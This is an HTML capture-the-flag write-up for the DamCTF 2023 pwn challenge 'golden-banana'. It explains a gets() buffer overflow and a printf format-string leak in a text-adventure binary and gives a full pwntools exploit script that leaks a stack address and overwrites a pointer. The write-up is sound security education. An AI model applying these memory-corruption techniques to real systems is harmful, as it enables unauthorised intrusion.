@@ -1,0 +1,218 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\DamCTF 2023">DamCTF 2023</a>
+            <a href="/CTF-writeups\DamCTF 2023\golden-banana/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>golden-banana</span>
+            <span class="text-right">[480]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>We are given a tar.gz file containing a binary with source code and game-data, together with a docker setup.</p>
+<blockquote>
+<p>The Quest for the Golden Banana is a text-based adventure game that combines humor, action, and mystery in an epic story that will keep you hooked until the end. Explore exotic locations, interact with colorful characters, and make choices that will shape your destiny. Do you have what it takes to complete The Quest for the Golden Banana?</p>
+<p>The story for this challenge was entirely written by the Bing AI chatbot :-)</p>
+<p><code>nc chals.damctf.xyz 30234</code></p>
+<p>Downloads<br />
+<a href="https://rctf-bucket.storage.googleapis.com/uploads/c0efbd9b573a61a884a18a998720613db8bade14c5b20c80b19bf432a73eff69/golden-banana.tar.gz">golden-banana.tar.gz</a></p>
+</blockquote>
+<hr />
+<h3>Overview</h3>
+<p>Given that we have the source, that is an obvious place to start. Without going into much depth, the code loads a <code>game</code>-object from <code>game.dat</code>, which it uses to specify <code>locations</code> and <code>choices</code>. It's all neatly described by the structs:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_choice</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">description</span><span class="p">[</span><span class="n">MAX_STRING</span><span class="p">];</span><span class="w"> </span><span class="c1">// Description of the choice</span>
+<span class="w">    </span><span class="n">location</span><span class="w"> </span><span class="o">*</span><span class="n">location</span><span class="p">;</span><span class="w">           </span><span class="c1">// Where to go when this choice is chosen</span>
+<span class="p">}</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span><span class="w"></span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_location</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">description</span><span class="p">[</span><span class="n">MAX_STRING</span><span class="p">];</span><span class="w"> </span><span class="c1">// Description of the location</span>
+<span class="w">    </span><span class="n">choice</span><span class="w"> </span><span class="n">choices</span><span class="p">[</span><span class="n">MAX_CHOICES</span><span class="p">];</span><span class="w">  </span><span class="c1">// List of choices</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">num_choices</span><span class="p">;</span><span class="w">              </span><span class="c1">// Number of choices</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">end_location</span><span class="p">;</span><span class="w">             </span><span class="c1">// Whether the game should end when reaching this location (0 or 1)</span>
+<span class="p">}</span><span class="w"> </span><span class="n">location</span><span class="p">;</span><span class="w"></span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_game</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">location</span><span class="w"> </span><span class="o">*</span><span class="n">current_location</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">input_buf</span><span class="p">[</span><span class="n">MAX_STRING</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="n">location</span><span class="w"> </span><span class="n">locations</span><span class="p">[</span><span class="n">MAX_LOCATIONS</span><span class="p">];</span><span class="w"></span>
+<span class="p">}</span><span class="w"> </span><span class="n">game</span><span class="p">;</span><span class="w"></span>
+</code></pre></div>
+
+<p>So, the game holds the current location, an input-buffer and a list of locations. Each location holds a description and multiple choices. Each choice has it's own description, which points to what location it routes to. A classic text adventure.</p>
+<p>Notably, instead of containing pointers to descriptions, each object instead has a buffer of size <code>MAX_STRING=1024</code>. This opens the door to possible corruption, but it also makes the <code>game</code>-object absolutely massive, 163840 bytes according to ghidra.</p>
+<p>Opening <code>game.dat</code>, we find an interesting location, number 15, that seems to contain the flag:</p>
+<div class="codehilite"><pre><span></span><code>15 SECRET ROOM: dam{REDACTED} (server has the real flag)
+0
+1
+</code></pre></div>
+
+<p>Critically, none of the choices in the other locations point to this location, so there is no way to get there.</p>
+<hr />
+<h3>Exploitation</h3>
+<p>The first obvious vulnerability comes in the main function:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="c1">// Get choice from user</span>
+<span class="w">            </span><span class="n">gets</span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="n">input_buf</span><span class="p">);</span><span class="w"></span>
+</code></pre></div>
+
+<p>A very obvious buffer overflow. Inspecting with ghidra or gdb, we can see that the input buffer is located before the rest of the game object (this can also be seen by examining the struct). So, we can overflow into the rest of the struct, potentially pointing one of the choices at the secret room.</p>
+<p>To do this however, we would need a leak. This is where the second vulnerability comes into play:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">print_location</span><span class="p">(</span><span class="n">location</span><span class="w"> </span><span class="o">*</span><span class="n">l</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">end_location</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">l</span><span class="o">-&gt;</span><span class="n">num_choices</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d: %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">l</span><span class="o">-&gt;</span><span class="n">choices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">description</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>The program uses a plain printf to show the location description. If the description gets overwritten, we can simply leak a stack pointer from the stack using "%p".</p>
+<p>There is, however, a problem. As the program is arranged, the very first description we can reach is for location 0, and the code flow does not allow us to return to location 0. Therefore, we must overflow one of the other descriptions, but that would mean overwriting pointers in the choices, which would cause the program to segfault.</p>
+<p>The solution comes from room 4. Look at the game-data:</p>
+<div class="codehilite"><pre><span></span><code>0 You are a monkey who lives in the jungle. You have heard stories about a golden banana that grants incredible powers to whoever eats it. You want to find this banana and become the king of the jungle. What do you do?
+2
+1 Go north
+2 Go south
+0
+1 You go north and encounter a river. The river is wide and deep, but you see a vine hanging from a tree on the other side. You think you can swing across the river using the vine. Do you try it?
+2
+3 Yes, swing across
+4 No, go back
+0
+2 You go south and encounter a snake. The snake is long and venomous, but you see a shiny object in its mouth. It looks like a key. You think you can grab the key from the snake&#39;s mouth. Do you try it?
+2
+5 Yes, grab the key
+4 No, go back
+0
+3 You swing across the river using the vine. You land safely on the other side and see a cave entrance. You wonder if the golden banana is inside the cave. Do you enter it?
+2
+6 Yes, enter the cave
+4 No, swing back
+0
+4 You decide to go back to where you started. Maybe there is another way to find the golden banana. What do you do?
+2
+1 Go north
+2 Go south
+0
+</code></pre></div>
+
+<p>As it stands, location 4 allows us to return to location 1 or 2, without having to use pointers that are in the way. So, we navigate to location 4, overwrite until location 1 description, after which we can leak a stack pointer.</p>
+<p>From here, the challenge is simple. At this point, we are at location 1, therefore, we must simply overwrite choice 1 or 2 of location 1 with a pointer to location 15.</p>
+<hr />
+<h3>Solution</h3>
+<p>The entire solve script looks like this:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./golden_banana&quot;</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/tools/peda/peda.py&quot;</span>
+<span class="c1"># conn = gdb.debug(&quot;./golden_banana&quot;, &#39;&#39;&#39;</span>
+<span class="c1"># b *(&amp;main+189)</span>
+<span class="c1"># c</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+
+<span class="c1"># conn = process(&quot;./golden_banana&quot;)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&quot;chals.damctf.xyz&quot;</span><span class="p">,</span> <span class="mi">30234</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;south</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>  <span class="c1"># Navigate to location 1</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;back</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>  <span class="c1"># Navigate to location 4</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">6184</span>  <span class="c1"># Padding until north description</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;%p&quot;</span>  <span class="c1"># First stack value is a stack pointer</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;south</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># Overwrite location 1&#39;s description</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1:&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked stack address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">gets_start</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x58a0</span>  <span class="c1"># Address input buffer</span>
+<span class="n">target_address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3878</span>  <span class="c1"># Address of location 1, choice 1 (location pointer)</span>
+<span class="n">target_pointer</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0xd9b8</span>  <span class="c1"># Address of secret room</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Writing </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">target_pointer</span><span class="p">)</span><span class="si">}</span><span class="s2"> to </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">target_address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="n">target_address</span> <span class="o">-</span> <span class="n">gets_start</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_pointer</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;back</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># We don&#39;t need to specify room choice: find_match figures it out</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>The offsets are calculated manually from debugging with gdb.</p>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
